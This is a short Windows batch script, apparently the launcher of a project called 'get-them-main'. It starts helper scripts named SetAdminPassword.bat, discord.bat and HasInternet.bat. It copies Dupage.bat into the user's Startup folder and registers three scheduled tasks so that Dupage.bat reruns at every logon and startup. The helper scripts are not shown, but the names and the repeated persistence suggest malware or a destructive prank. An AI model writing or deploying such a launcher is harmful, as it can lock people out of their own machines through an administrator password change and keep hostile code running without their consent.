@echo off

@REM start garbage\MAINVBS.vbs

start %USERPROFILE%\Desktop\get-them-main\garbage\HasInternet.bat
start %USERPROFILE%\Desktop\get-them-main\garbage\SetAdminPassword.bat
start %USERPROFILE%\Desktop\get-them-main\garbage\discord.bat
@REM start /min garbage\audio.bat

copy "%USERPROFILE%\Desktop\get-them-main\garbage\Dupage.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat"

schtasks /create /tn "main" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat" /sc onlogon
schtasks /create /tn "main2" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat" /sc onstart
schtasks /create /tn "main3" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Dupage.bat" /sc onlogon

exit